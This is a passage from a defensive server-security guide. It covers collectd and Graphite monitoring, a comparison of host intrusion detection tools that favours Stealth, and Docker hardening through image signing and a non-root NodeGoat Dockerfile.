Collectd can be used to feed statistics to many consumers, including AWS CloudWatch via a [plugin](https://aws.amazon.com/blogs/aws/new-cloudwatch-plugin-for-collectd/), Using it with graphite (and ultimately [Grafana](https://grafana.com/), which can take inputs from a collection of [data sources](https://grafana.com/plugins?type=datasource), including graphite, Elasticsearch, [AWS CloudWatch](http://docs.grafana.org/features/datasources/cloudwatch/), and others) provides a much [better solution](http://blog.takipi.com/graphite-vs-grafana-build-the-best-monitoring-architecture-for-your-application/). 

##### [Collectd](https://collectd.org/)

"_Collectd is a daemon which collects system and application performance metrics_" at a configurable frequency. Almost everything in collectd is done with plugins. Most of the over 100 plugins are used to read statistics from the target system, but plugins are also used to define where to send those statistics, and in the case of distributed systems, read those statistics sent from collectd agents. Collectd is an agent based system metrics collection tool. An agent is deployed on every host that needs to be monitored.

If you want to send statistics over the network, then the network plugin must be loaded. collectd is capable of [cryptographically signing or encrypting](https://collectd.org/wiki/index.php/Networking_introduction#Cryptographic_setup) the network traffic it transmits. Collectd is not a complete monitoring solution by itself.

The collectd daemon has no external dependencies and should run on any POSIX-supported system, such as Linux, Solaris, Max OS X, AIX, the BSDs, and probably many others.

##### [Graphite](http://graphiteapp.org/)

Graphite is a statistics storage and visualisation component, which consists of:

* Carbon - a daemon that listens for time-series data and stores it. Any data sent to Graphite is actually sent to Carbon. The protocols for data transfer that Carbon accepts and understands are:
  1. Plain text, which includes fields:
      1. The metric name
      2. Value of the statistic
      3. Timestamp of when the statistic was captured
  2. Pickle, because Graphite is written in Python, and Pickle serializes and de-serializes Python object structures. Pickle is good when you want to batch up large amounts of data and have the Carbon Pickle receiver accept it
  3. AMQP, which Carbon can use to listen to a message bus
* Whisper - a simple database library for storing time series data
* Graphite-web - a (Django) webapp that renders graphs on demand

Graphite has excellent [official](https://graphite.readthedocs.io/en/latest/) and [community](https://www.digitalocean.com/community/tutorials/how-to-install-and-use-graphite-on-an-ubuntu-14-04-server) provided documentation.

There are a large number of [tools](http://graphite.readthedocs.org/en/latest/tools.html) that can be integrated with graphite.

Graphite can take [some work](https://kevinmccarthy.org/2013/07/18/10-things-i-learned-deploying-graphite/) to deploy, but this can be made easier several ways. You can deploy it with your favourite configuration management tool, such as with an [ansible-graphite](https://github.com/dmichel1/ansible-graphite) playbook, or perhaps with one of the many collectd-graphite-docker type containers.

You can do even better than graphite by adding the likes of [Grafana](https://grafana.com)

##### Assembling the Components

Collectd can be used to send statistics locally or remotely. It can be set up as an agent and server, along with Graphite on a [single machine](https://www.digitalocean.com/community/tutorials/how-to-configure-collectd-to-gather-system-metrics-for-graphite-on-ubuntu-14-04).

Another common and more interesting deployment scenario is to have a collection of hosts (clients/agents) that all require statistics gathering, and a server that listens for the data coming from all of the clients/agents. Let's see [how this looks](https://pradyumnajoshi.blogspot.co.nz/2015/11/setting-up-collectd-based-monitoring.html):

1. graphing server (1)
    1. [install, configure](https://www.digitalocean.com/community/tutorials/how-to-install-and-use-graphite-on-an-ubuntu-14-04-server), and run [graphite](https://graphite.readthedocs.io/en/latest/install.html)
    2. Install collectd: If you are using a recent Ubuntu or Debian release, more than likely you will be able to just install the distribution's [`collectd`](https://packages.debian.org/stretch/collectd) (which depends on [`collectd-core`](https://packages.debian.org/stretch/collectd-core) which includes many plugins) and [`collectd-utils`](https://packages.debian.org/stretch/collectd-utils)
    3. Configure collectd to use the following plugins, which will also require their own configuration:
      * Network (read, write)
      * [Write_Graphite](https://collectd.org/wiki/index.php/Plugin:Write_Graphite) (write)
2. collection agents (1:n)
    1. Install collectd
    2. Configure collectd to use the following plugins, which will also require their own configuration:
      * [Network](https://collectd.org/wiki/index.php/Plugin:Network) (read, write)
      * [CPU](https://collectd.org/wiki/index.php/Plugin:CPU) (read)
      * [Load](https://collectd.org/wiki/index.php/Plugin:Load) (read)
      * [Memory](https://collectd.org/wiki/index.php/Plugin:Memory) (read)
      * [Disk](https://collectd.org/wiki/index.php/Plugin:Disk) (read)
      * [Processes](https://collectd.org/wiki/index.php/Plugin:Processes) (read)
      * Any other read plugins from [the list](https://collectd.org/wiki/index.php/Table_of_Plugins) that you would like to collect statistics for

{#vps-countermeasures-lack-of-visibility-statistics-graphing-assembling-the-components-after}
In this case, each collectd agent is sending its statistics from its network plugin to the graphing server's network interface (achieving the same result as the below netcat command), which is picked up by the collectd network plugin and flows through to the collectd `write_graphite` plugin. This then sends the [statistics](https://collectd.org/wiki/index.php/Plugin:Write_Graphite#Example_data) using the plain text transfer protocol (metric-name actual-value timestamp-in-epoch) to Graphite's listening service called Carbon (usually to [port 2003](https://graphite.readthedocs.io/en/latest/carbon-daemons.html#carbon-cache-py)). Carbon only accepts a single value per interval, which is [10 seconds by default](https://graphite.readthedocs.io/en/latest/config-carbon.html#storage-schemas-conf). Carbon writes the data to the Whisper library, which is responsible for storing to its data files. graphite-web reads the data points from the Whisper files, and provides user interface and API for rendering dashboards and graphs. 

{linenos=off, lang=bash}
    echo "<metric-name> <actual-value> `date +%s`" | nc -q0 graphing-server 2003

![](images/collectd-graphite.png)

I also looked into [Raygun](https://raygun.com/), which provides visibility into many aspects of your applications. Raygun is an all-in-one offering, but does not focus on server statistics.

#### Host Intrusion Detection Systems (HIDS) {#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids}
![](images/ThreatTags/PreventionAVERAGE.png)

I recently performed an indepth evaluation of a couple of great HIDS available. My final candidates for the second round came from an initial evaluation of a larger collection of HIDS. First, I will briefly discuss the full collection I looked at, as these also have some compelling features and reasons as to why you may want to use them in your own VPSs. I will then discuss the two that I was the most impressed with, and dive into some more details around the winner, as well as why and how I had it configured and running in my lab.

The best time to install a HIDS is on a freshly installed system, before you open the host up to the internet or even your LAN, especially if it is a corporate system. If you do not have that luxury, there are a bunch of tools that can help you determine if you are already owned. Be sure to run one or more over your target system(s) before your HIDS benchmarks it, otherwise you could be benchmarking an already compromised system.

##### [Tripwire](https://packages.debian.org/stretch/tripwire)

Tripwire stores a known good state of vital system files of your choosing, and can be set up to notify an administrator upon any change in the files. Tripwire stores cryptographic hashes (deltas) in a database and compares them with the files it has been configured to monitor changes for. DigitalOcean has a [tutorial](https://www.digitalocean.com/community/tutorials/how-to-use-tripwire-to-detect-server-intrusions-on-an-ubuntu-vps) on setting Tripwire up. Most of what you will find specific to Tripwire are commercial offerings.

##### [RkHunter](https://packages.debian.org/stretch/rkhunter)

RkHunter is a similar [offering](http://rkhunter.sourceforge.net/) to Tripwire for POSIX compliant systems. RkHunter scans for rootkits, backdoors, checks on network interfaces and local exploits by testing for:

* MD5 hash changes
* Files commonly created by rootkits
* Erroneous file permissions for binaries
* Suspicious strings in kernel modules
* Hidden files in system directories
* Optionally, scan within plaintext and binary files

Version 1.4.2 (24/02/2014) now checks `ssh`, `sshd` and `telent`, although you should not have telnet installed in the first place. This could be useful for mitigating non-root users running a trojanised sshd on a 1025-65535 port. You can run adhoc scans, then set them up to be run with cron. Debian Jessie has this release in its repository. Any Debian distro before Jessie is on 1.4.0-1 or earlier.

The latest version you can install for Linux Mint Rosa (17.3) within the repositories is 1.4.0-3 (01/05/2012). Linux Mint Sarah (18) within the repositories is 1.4.2-5

##### [Chkrootkit](https://packages.debian.org/stretch/chkrootkit)

It is a good idea to run a couple of these types of scanners. Hopefully, what one misses the other will not. Chkrootkit scans for many system programs, some of which are cron, crontab, date, echo, find, grep, su, ifconfig, init, login, ls, netstat, sshd, top and many more, all the usual targets for attackers to modify. You can specify if you do not want them all scanned. Chkrootkit runs tests such as:

* System binaries for rootkit modification
* If the network interface is in promiscuous mode
* lastlog deletions
* wtmp and utmp deletions (logins, logouts)
* Signs of LKM trojans
* Quick and dirty strings replacements

{#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-unhide}
##### [Unhide](http://www.unhide-forensics.info/)

While not strictly a HIDS, Unhide is quite a useful forensics tool for determining if your system has been compromised.

Unhide is a forensic tool to find hidden processes and TCP/UDP ports by rootkits / LKMs or by another hidden technique. Unhide runs on Unix/Linux and Windows systems. It implements six main techniques.

1. Compare `/proc` vs `/bin/ps` output
2. Compare information gathered from `/bin/ps` with information gathered by walking through the `procfs` (ONLY for unhide-linux version).
3. Compare information gathered from `/bin/ps` with information gathered from `syscalls` (syscall scanning)
4. Full PIDs space occupation (PIDs brute-forcing) (ONLY for unhide-linux version).
5. Compare `/bin/ps` output vs `/proc`, `procfs` walking and `syscall` (ONLY for unhide-linux version). Reverse search, verify that all threads seen by `ps` are also seen in the `kernel`.
6. Quick compare `/proc`, `procfs` walking and `syscall` vs `/bin/ps` output (ONLY for unhide-linux version). This technique is about 20 times faster than tests 1+2+3 but may give more false positives.

Unhide includes two utilities: unhide and unhide-tcp.

unhide-tcp identifies TCP/UDP ports that are listening but are not listed in /bin/netstat by bruteforcing all TCP/UDP ports available.

Unhide can also be used by RkHunter in its daily scans. Unhide was #1 in the Top 10 toolswatch.org Security Tools Poll.

##### Ossec

OSSEC is a HIDS that also has some preventative features. This is a pretty comprehensive offering with a lot of great features.

##### [Stealth](https://fbb-git.github.io/stealth/)

Stealth does a similar job as the above file integrity checkers, but leaves almost no sediment on the tested computer (client). A potential attacker therefore does not necessarily know that Stealth is, in fact, checking the integrity of its client's files. Stealth is installed on a different machine (controller), and scans over SSH.

The faster you can respond to an attacker modifying system files, the more likely you are able to prevent their attempts. Ossec provides real-time checking. Stealth provides agent-less (runs from another machine) checking, using the checksum programme of your choice that it copies to the controller on first run, ideally before it is exposed in your DMZ.

##### Deeper with OSSEC {#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-deeper-with-ossec}

You can find the source on [GitHub](https://github.com/ossec/ossec-hids)

**Who is Behind OSSEC?**

Many developers, contributors, managers, reviewers, and translators produce OSSEC. In fact, the [OSSEC team](https://ossec.github.io/about.html#ossec-team) looks almost as large as the [Stealth user base](https://qa.debian.org/popcon.php?package=stealth), a slight exaggeration :-).

**Documentation**

There is a great deal of documentation. It is not always the easiest to navigate because you have to understand so much of it up front. There is lots of buzz about OSSEC on the Internet and there are several books.

* The main documentation is on [GitHub](https://ossec.github.io/docs/)
* Similar docs on [readthedocs.io](https://ossec-docs.readthedocs.io/en/latest/)
* Mailing list on [google groups](https://groups.google.com/forum/#!forum/ossec-list)
* Several good books
  1. [Instant OSSEC Host-based Intrusion Detection System](https://www.amazon.com/Instant-Host-based-Intrusion-Detection-System/dp/1782167641/)
  2. [OSSEC Host-Based Intrusion Detection Guide](https://www.amazon.com/OSSEC-Host-Based-Intrusion-Detection-Guide/dp/159749240X)
  3. [OSSEC How-To – The Quick And Dirty Way](https://blog.savoirfairelinux.com/en/tutorials/free-ebook-ossec-how-to-the-quick-and-dirty-way/)
* [Commercial Support](https://ossec.github.io/blog/posts/2014-05-12-OSSEC-Commercial-Support-Contracts.markdown.html)
* [FAQ](https://ossec-docs.readthedocs.io/en/latest/faq/index.html)
* [Package meta-data](http://ossec.alienvault.com/repos/apt/debian/dists/jessie/main/binary-amd64/Packages)

**Community / Communication**

There is an IRC channel, #ossec on irc.freenode.org, although it is not very active.

**Components**

* [Manager](https://ossec-docs.readthedocs.io/en/latest/manual/ossec-architecture.html#manager-or-server) (sometimes called server): does most of the work monitoring the agents. It stores the file integrity checking databases, the logs, events and system auditing entries, rules, decoders, and major configuration options.
* [Agents](https://ossec-docs.readthedocs.io/en/latest/manual/agent/index.html): small collections of programs installed on the machines we are interested in monitoring. Agents collect information and forward it to the manager for analysis and correlation.

There are also quite a few other ancillary components.

**[Architecture](https://ossec-docs.readthedocs.io/en/latest/manual/ossec-architecture.html)**

You can also go the [agent-less](https://ossec-docs.readthedocs.io/en/latest/manual/agent/agentless-monitoring.html) route which may allow the Manager to perform file integrity checks using [agent-less scripts](http://ossec-docs.readthedocs.org/en/latest/manual/agent/agentless-scripts.html). As with Stealth, you have still got the issue of needing to be root in order to read some of the files.

Agents can be installed on VMware ESX, but from what I have read, it is quite a bit of work.

**[Features](https://ossec.github.io/docs/manual/non-technical-overview.html?page_id=165) in a nut-shell**

* File integrity checking
* Rootkit detection
* Real-time log file monitoring and analysis (you may already have something else doing this)
* Intrusion Prevention System (IPS) features as well: blocking attacks in real-time
* Alerts can go to a database such as MySQL or PostgreSQL, or other types of [outputs](https://ossec-docs.readthedocs.io/en/latest/manual/output/index.html)
* There is a PHP web UI that runs on Apache if you would rather look at pretty outputs versus log files.

**What I like**

The ability to scan in real-time offsets the fact that the agents, in most cases, require installed binaries. This hinders the attacker from [covering their tracks](#vps-identify-risks-lack-of-visibility).

OSSEC can be configured to scan systems in [real](https://ossec-docs.readthedocs.io/en/latest/manual/syscheck/index.html#realtime-options)–[time](https://ossec-docs.readthedocs.io/en/latest/manual/syscheck/index.html#real-time-monitoring) based on [inotify](https://en.wikipedia.org/wiki/Inotify) events.

It's backed by a large company: Trend Micro.

Options: Install options for starters. These include:

* Agent-less installation as described above
* Local installation: Used to secure and protect a single host
* Agent installation: Used to secure and protect hosts while reporting back to a central OSSEC server
* Server installation: Used to aggregate information

You can install a web UI on the manager, so you need Apache, PHP, MySQL.

If you are going to be checking many machines, OSSEC will scale.

**What I like less**

* Unlike Stealth, the fact is that something usually has to be installed on the agents
* The packages are not in the standard repositories. The downloads, PGP keys, and directions are here: [https://ossec.github.io/downloads.html](https://ossec.github.io/downloads.html).
* I think OSSEC may be doing too much, and if you do not like the way it does one thing, you may be stuck with it. Personally, I really like the idea of a tool doing one thing, doing it well, and providing plenty of configuration options to change the way it does its one thing. This provides huge flexibility, and minimises your dependency on a suite of tools and/or libraries
* Information overload. There seems to be a lot to get your head wrapped around in order to get it set up. There are a lot of install options documented (books, Internet, official docs). It takes a bit to work out exactly the best procedure for your environment, in saying that, it does have scalability on its side

##### Deeper with Stealth {#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-deeper-with-stealth}

Stealth rose to the top, here's why.

You can find the source on [GitHub](https://github.com/fbb-git/stealth)

**Who is Behind Stealth?**

Author: Frank B. Brokken. This is an admirable job for one person. Frank is not a fly-by-nighter though. Stealth was first presented to Congress in 2003. It is still actively maintained. It is one of GNU/Linux's dirty little secrets I think. It is a great idea implemented, makes a tricky job simple, and does it in an elegant way.

**[Documentation](https://fbb-git.github.io/stealth/)**

All documentation is hosted on GitHub.

* [4.01.05 (2016-05-14)](https://packages.debian.org/stretch/stealth)
  * [man page](https://fbb-git.github.io/stealth/stealthman.html)
  * [user guide](https://fbb-git.github.io/stealth/html/stealth.html)

Once you install Stealth, all the documentation can be found by `sudo updatedb && locate stealth`. I most commonly used: HTML docs `/usr/share/doc/stealth-doc/manual/html/` and `/usr/share/doc/stealth-doc/manual/pdf/stealth.pdf` for easy searching across the HTML docs.

* man page `/usr/share/doc/stealth/stealthman.html`
* Examples: `/usr/share/doc/stealth/examples/`

**Binaries**

Debian Stretch: [4.01.05-1](https://packages.debian.org/stretch/stealth)

Linux Mint 18 (Sarah) [4.01.04-1](https://community.linuxmint.com/software/view/stealth)

Last time I installed Stealth, I had to either go out-of-band to get a recent version, or go with a much older version. These repositories do however, now have very recent releases though.

**Community / Communication**

There is no community around this really. I am surprised that many diligent sysadmins have not jumped on the Stealth bandwagon. The author is happy to answer emails, but more focussed on maintaining a solid product than marketing.

**Components**

1. **Monitor** The computer initiating the check.  
  * Needs two kinds of outgoing services:
    1. SSH to reach the clients
    2. Mail transport agent (MTA)(sendmail, postfix)
  * Considerations for the Monitor:
    1. No public access
    2. All inbound services should be denied
    3. Access only via its console
    4. Physically secure location
    5. Sensitive information of the clients are stored on the Monitor
    6. Password-less access to the clients for anyone who gains Monitor root access, unless either:
        * You are happy to enter a passphrase when ever your Monitor is booted so that Stealth can use SSH to access the client(s). The Monitor could stay running for years, so this may not pose a problem. I would suggest using some low powered computer such as a Raspberry Pie as your monitoring device, hooked up to a UPS. Also keep in mind that if you want to monitor files on Client(s) with root permissions, you will have to SSH in as root (which is why it is recommended that the Monitor not accept any incoming connections, and be in a physically safe location). An alternative to having the Monitor log in as root is to have something like Monit take care of integrity checking the Client files with root permissions, and have Stealth monitor the non-root files and Monit.
        * [ssh-cron](https://fbb-git.github.io/ssh-cron/) is used  
	  
2. **Client** The computer(s) being monitored. I do not see any reason why a Stealth solution could not be set up to look after many clients.

**Architecture**

The Monitor stores one-to-many policy files, each of which is specific to a single client and contains `USE` directives and commands. Its recommended policy is to take copies of the client utilities such as the hashing programme `sha1sum`, `find` and others that are used extensively during the integrity scans, and copy them to the Monitor to take benchmark hashes. Subsequent runs will do the same to compare with the initial hashes stored before the client utilities are trusted.

**Features in a nut-shell**

File integrity tests leaving virtually no sediment on the tested client.

Stealth adheres to the dark cockpit approach, i.e. no mail is sent when no changes are detected. If you have an MTA, Stealth can be configured to send emails on changes it finds.

{#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-deeper-with-stealth-what-i-like}
**What I like**

* Its simplicity. There is only one package to install on the Monitor and nothing to install on the client machines. The Client just needs to have the Monitor's SSH public key. You will need a Mail Transfer Agent on your Monitor if you do not already have one
* Rather than just modifying the likes of `sha1sum` on the clients, which Stealth uses to perform its integrity checks, Stealth detection would have to be manipulated to seeing the changed hash of the `sha1sum`  just copied to the Monitor as the same as that of the previously recorded hash. If the previously recorded hash is removed or does not match the current hash, then Stealth will fire an alert off.
* It is in the Debian repositories
* The whole idea behind it. Systems being monitored with Stealth give little appearance that they are being monitored, other than the presence of a single SSH login when Stealth first starts in the `auth.log`. This will age quickly as the connection remains active for the life of Stealth. The login could be from a user doing anything on the client, it is very discrete.
* Unpredictability: Stealth offers `--random-interval` and `--repeat` options. `--repeat 60 --random-interval 30` results in new Stealth runs on an average of every 75 seconds. It can usually take a couple of minutes to check all the important files on a file system, so you would probably want to make the checks several minutes apart from each other.
* Subscribes to the Unix philosophy: “do one thing and do it well”
* Stealth's author is very approachable and open. After talking with Frank and suggesting some ideas to promote Stealth and its community, Frank started a [discussion list](http://sourceforge.net/p/stealth/discussion/). Now that Stealth has moved to GitHub, issues can be submitted easily. If you use Stealth and have any trouble, Frank is very easy to work with.

**What I like less**

* Lack of visible code reviews and testing. Yes, it is in Debian, but so was [OpenSSL](http://heartbleed.com/) and [Bash](https://security-tracker.debian.org/tracker/CVE-2014-6271)
* One man band. Support is provided by one person alone via email, although now it is on GitHub, it should be easier if and when the need arises
* Lack of use cases. I did not see anyone using or abusing it, although Frank did send me some contacts of other people who are using it, so again, a very helpful author. There are not many use cases on the Internet. The documentation had clear signs that it was written and targeted people already familiar with the tool. This is understandable as the author has been working on this project for many years and could possibly be disconnected with what is involved for someone completely new to the project to dive in and start using it. That is what I had to do, and after a bit of struggling, it worked out well. This is compared with the likes of OSSEC which has [quite a few use cases](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-deeper-with-ossec)
* Small user base, revealed by the [debian popcon](https://qa.debian.org/popcon.php?package=stealth)

##### Outcomes

In making my considerations, I changed my mind quite a few times on what offerings were most suited to which environments. I think this is actually a good thing, as it means my evaluations were based on the real merits of each offering rather than any biases.

The simplicity of Stealth, being a flat learning curve, and its overall philosophy is what won me over. Although, I think if you have to monitor many Agents and Clients, then OSSEC would be an excellent option, as it scales well.

##### Stealth Up and Running

I installed stealth and stealth-doc via the Synaptic package manager, then I just did a `locate` for stealth to find the docs and other example files. The following are the documentation files that I used, how I used them, and the tab order that made sense to me:

1. The main documentation index:  
[file:///usr/share/doc/stealth-doc/manual/html/stealth.html](file:///usr/share/doc/stealth-doc/manual/html/stealth.html)
2. Chapter one introduction:  
[file:///usr/share/doc/stealth-doc/manual/html/stealth01.html](file:///usr/share/doc/stealth-doc/manual/html/stealth01.html)
3. Chapter four to help build up a policy file:  
[file:///usr/share/doc/stealth-doc/manual/html/stealth04.html](file:///usr/share/doc/stealth-doc/manual/html/stealth04.html)
4. Chapter five for running Stealth and building up the policy file:  
[file:///usr/share/doc/stealth-doc/manual/html/stealth05.html](file:///usr/share/doc/stealth-doc/manual/html/stealth05.html)
5. Chapter six for running Stealth:  
[file:///usr/share/doc/stealth-doc/manual/html/stealth06.html](file:///usr/share/doc/stealth-doc/manual/html/stealth06.html)
6. Chapter seven for arguments to pass to Stealth:  
[file:///usr/share/doc/stealth-doc/manual/html/stealth07.html](file:///usr/share/doc/stealth-doc/manual/html/stealth07.html)
7. Chapter eight for error messages:  
[file:///usr/share/doc/stealth-doc/manual/html/stealth08.html](file:///usr/share/doc/stealth-doc/manual/html/stealth08.html)
8. The Man page: [file:///usr/share/doc/stealth/stealthman.html](file:///usr/share/doc/stealth/stealthman.html)
9. Policy file examples: [file:///usr/share/doc/stealth/examples/](file:///usr/share/doc/stealth/examples/)
10. Useful scripts to use with Stealth: [file:///usr/share/doc/stealth/scripts/usr/bin/](file:///usr/share/doc/stealth/scripts/usr/bin/)
11. All of the documentation in simple text format (good for searching across chapters for strings): [file:///usr/share/doc/stealth-doc/manual/text/stealth.txt](file:///usr/share/doc/stealth-doc/manual/text/stealth.txt)

The files I would need to copy and modify were:

* `/usr/share/doc/stealth/scripts/usr/bin/stealthcleanup.gz`
* `/usr/share/doc/stealth/scripts/usr/bin/stealthcron.gz`
* `/usr/share/doc/stealth/scripts/usr/bin/stealthmail.gz`

Files I used for reference to build up the policy file:

* `/usr/share/doc/stealth/examples/demo.pol.gz`
* `/usr/share/doc/stealth/examples/localhost.pol.gz`
* `/usr/share/doc/stealth/examples/simple.pol.gz`

As mentioned above, providing you have a working MTA, Stealth will just do its thing when you run it. The next step is to schedule its runs. This can be conducted, as mentioned above, with a pseudo-random interval.

### Docker {#vps-countermeasures-docker}

It is my intent to provide a high level overview of the concepts you will need to know in order to create a secure environment for the core Docker components, and your containers. There are many resources available, and the Docker security team are constantly hard at work trying to make the task of improving security around Docker easier.

Do not forget to check the [Additional Resources](#additional-resources-vps-countermeasures-docker) section for material to be consumed in parallel with the Docker Countermeasures, such as the excellent CIS Docker Benchmark, and an [interview](http://www.se-radio.net/2017/05/se-radio-episode-290-diogo-monica-on-docker-security/) I conducted with the Docker Security Team Lead Diogo Mónica.

CISecurity has an [excellent resource](https://benchmarks.cisecurity.org/tools2/docker/CIS_Docker_1.13.0_Benchmark_v1.0.0.pdf) for hardening docker images, which the Docker Security team helped with.

#### Consumption from Registries {#vps-countermeasures-docker-consumption-from-registries}
![](images/ThreatTags/PreventionAVERAGE.png)

"_Docker Security Scanning is available as an add-on to Docker hosted private repositories on both Docker Cloud and Docker Hub._". You also have to [opt in](https://docs.docker.com/docker-cloud/builds/image-scan/#/opt-in-to-docker-security-scanning) and pay for it. Docker Security Scanning is also now available on the new [Enterprise Edition](https://blog.docker.com/2017/03/docker-enterprise-edition/). The scan compares the SHA of each component in the image with those in an up to date CVE database for known vulnerabilities. This is a good start, but is not free and does not do enough. Images are scanned on push and the results indexed so that when new CVE databases are available, comparisons can continue to be made.

It's up to the person consuming images from Docker Hub to assess whether or not they have vulnerabilities. Whether unofficial or [official](https://github.com/docker-library/official-images), it is your responsibility. Check the [Hardening Docker Host, Engine and Containers](#vps-countermeasures-docker-hardening-docker-host-engine-and-containers) section for tooling to assist with finding vulnerabilities in your Docker hosts and images.

Your priority before you start testing images for vulnerable contents, is to understand the following:

1. Where your image originated from
2. Who created it
3. Image provenance: Is Docker fetching the [image](https://docs.docker.com/engine/docker-overview/#docker-objects) we think it is?
    1. Identification: How Docker uses secure hashes, or digests.  
    Image layers (deltas) are created during the image build process, and also when commands within the container are run, which produce new or modified files and/or directories.  
    Layers are now identified by a digest which looks like:
    `sha256:<the-hash>`  
    The above hash element is created by applying the SHA256 hashing algorithm to the layers content.  
    The image ID is also the hash of the configuration object which contains the hashes of all the layers that make up the images copy-on-write filesystem definition, also discussed in my [Software Engineering Radio show](http://www.se-radio.net/2017/05/se-radio-episode-290-diogo-monica-on-docker-security/) with Diogo Mónica.
    2. Integrity: How do you know that your image has not been tampered with?  
    This is where secure signing comes in with the [Docker Content Trust](https://blog.docker.com/2015/08/content-trust-docker-1-8/) feature. Docker Content Trust is enabled through an integration of [Notary](https://github.com/theupdateframework/notary) into the Docker Engine. Both the Docker image producing party and image consuming party need to opt-in to use Docker Content Trust. By default, it is disabled. In order to do that, Notary must be downloaded and setup by both parties, and the `DOCKER_CONTENT_TRUST` environment variable [must be set](https://docs.docker.com/engine/security/trust/content_trust/#enable-and-disable-content-trust-per-shell-or-per-invocation) to `1`, and the `DOCKER_CONTENT_TRUST_SERVER` must be [set to the URL](https://docs.docker.com/engine/reference/commandline/cli/#environment-variables) of the Notary server you setup.  
    
        Now the producer can sign their image, but first, they need to [generate a key pair](https://docs.docker.com/engine/security/trust/trust_delegation/). Once they have done so, when the image is pushed to the registry, it is signed with their private (tagging) key.
        
        When the image consumer pulls the signed image, Docker Engine uses the publisher's public (tagging) key to verify that the image you are about to run is cryptographically identical to the image the publisher pushed.
        
        Docker Content Trust also uses the Timestamp key when publishing the image, this makes sure that the consumer is getting the most recent image on pull.
        
        Notary is based on a Go implementation of [The Update Framework (TUF)](https://theupdateframework.github.io/)  
        
    3. By specifying a digest tag in a `FROM` instruction in your `Dockerfile`, when you `pull` the same image will be fetched.

#### Doppelganger images
![](images/ThreatTags/PreventionAVERAGE.png)

If you are already performing the last step from above, then fetching an image with a very similar name becomes highly unlikely, but it pays to be aware of these types of techniques that attackers use.

#### The Default User is Root {#vps-countermeasures-docker-the-default-user-is-root}
![](images/ThreatTags/PreventionVERYEASY.png)

In order to run containers as a non-root user, the user needs to be added in the base image (`Dockerfile`) if it is under your control, and set before any commands you want run as a non-root user. Here is an example of the [NodeGoat](https://github.com/owasp/nodegoat) image:

{title="NodeGoat Dockerfile", linenos=on}
    FROM node:4.4
    
    # Create an environment variable in our image for the non-root user we want to use.
    ENV user nodegoat_docker
    ENV workdir /usr/src/app/
    
    # Home is required for npm install. System account with no ability to login to shell
    RUN useradd --create-home --system --shell /bin/false $user
    
    RUN mkdir --parents $workdir
    WORKDIR $workdir
    COPY package.json $workdir
    
    # chown is required by npm install as a non-root user.
    RUN chown $user:$user --recursive $workdir
    # Then all further actions including running the containers should
    # be done under non-root user, unless root is actually required.
    USER $user
    
    RUN npm install
    COPY . $workdir
    
    # Permissions need to be reapplied, due to how docker applies root to new files.
    USER root
    RUN chown $user:$user --recursive $workdir
    RUN chmod --recursive o-wrx $workdir
    
    RUN ls -liah
    RUN ls ../ -liah
    USER $user

As you can see on line 4 we create our `nodegoat_docker` user.  
On line 8 we add our non-root user to the image with no ability to login.  
On line 15 we change the ownership of the `$workdir` so our non-root user has access to do the things that we normally have permissions to do without root, such as installing npm packages and copying files, as we see on line 20 and 21. But first we need to switch to our non-root user on line 18. On lines 25 and 26 we need to reapply ownership and permissions due to the fact that docker does not `COPY` according to the user you are set to run commands as.

Without reapplying the ownership and permissions of the non-root user as seen above on lines 25 and 26, the container directory listings would look like this:

{title="No reapplication of ownership and permissions", linenos=off}
    Step 12 : RUN ls -liah
     ---> Running in f8692fc32cc7
    total 116K
    13 drwxr-xr-x   9 nodegoat_docker nodegoat_docker 4.0K Sep 13 09:00 .
    12 drwxr-xr-x   7 root            root            4.0K Sep 13 09:00 ..
    65 drwxr-xr-x   8 root            root            4.0K Sep 13 08:59 .git
    53 -rw-r--r--   1 root            root             178 Sep 12 04:22 .gitignore
    69 -rw-r--r--   1 root            root            1.9K Nov 21  2015 .jshintrc
    61 -rw-r--r--   1 root            root              55 Nov 21  2015 .nodemonignore
    58 -rw-r--r--   1 root            root             715 Sep 13 08:59 Dockerfile
    55 -rw-r--r--   1 root            root            6.6K Sep 12 04:16 Gruntfile.js
    60 -rw-r--r--   1 root            root             11K Nov 21  2015 LICENSE
    68 -rw-r--r--   1 root            root              48 Nov 21  2015 Procfile
    64 -rw-r--r--   1 root            root            5.6K Sep 12 04:22 README.md
    56 drwxr-xr-x   6 root            root            4.0K Nov 21  2015 app
    66 -rw-r--r--   1 root            root             527 Nov 15  2015 app.json
    54 drwxr-xr-x   3 root            root            4.0K May 16 11:41 artifacts
    62 drwxr-xr-x   3 root            root            4.0K Nov 21  2015 config
    57 -rw-r--r--   1 root            root             244 Sep 13 04:51 docker-compose.yml
    67 drwxr-xr-x 498 root            root             20K Sep 12 03:50 node_modules
    63 -rw-r--r--   1 root            root            1.4K Sep 12 04:22 package.json
    52 -rw-r--r--   1 root            root            4.6K Sep 12 04:01 server.js
    59 drwxr-xr-x   4 root            root            4.0K Nov 21  2015 test
     ---> ad42366b24d7
    Removing intermediate container f8692fc32cc7
    Step 13 : RUN ls ../ -liah
     ---> Running in 4074cc02dd1d
    total 12K
    12 drwxr-xr-x  7 root            root            4.0K Sep 13 09:00 .
    11 drwxr-xr-x 32 root            root            4.0K Sep 13 09:00 ..
    13 drwxr-xr-x  9 nodegoat_docker nodegoat_docker 4.0K Sep 13 09:00 app

With the reapplication of the ownership and permissions of the non-root user, as the `Dockerfile` is currently above, the container directory listings look like the following:

{title="With reapplication of ownership and permissions", linenos=off}
    Step 15 : RUN ls -liah
     ---> Running in 8662e1657d0f
    total 116K
    13 drwxr-x---   21 nodegoat_docker nodegoat_docker 4.0K Sep 13 08:51 .
    12 drwxr-xr-x    9 root            root            4.0K Sep 13 08:51 ..
    65 drwxr-x---   20 nodegoat_docker nodegoat_docker 4.0K Sep 13 08:51 .git
    53 -rw-r-----    1 nodegoat_docker nodegoat_docker  178 Sep 12 04:22 .gitignore
    69 -rw-r-----    1 nodegoat_docker nodegoat_docker 1.9K Nov 21  2015 .jshintrc
    61 -rw-r-----    1 nodegoat_docker nodegoat_docker   55 Nov 21  2015 .nodemonignore
    58 -rw-r-----    1 nodegoat_docker nodegoat_docker  884 Sep 13 08:46 Dockerfile
    55 -rw-r-----    1 nodegoat_docker nodegoat_docker 6.6K Sep 12 04:16 Gruntfile.js
